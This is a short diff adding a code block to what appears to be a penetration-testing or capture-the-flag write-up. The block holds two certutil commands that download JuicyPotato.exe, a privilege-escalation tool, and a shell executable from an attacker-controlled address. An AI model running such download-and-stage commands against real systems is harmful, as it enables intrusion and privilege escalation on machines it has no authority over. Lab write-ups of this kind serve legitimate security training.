@@ -971,6 +971,12 @@ Scan complete.
 
 ```
 
+```
+certutil -UrlCache -f http://10.10.16.9:8081/JuicyPotato.exe jp.exe
+
+certutil -UrlCache -f http://10.10.16.9:8081/shell.exe s.exe
+```
+
 
 ***
 
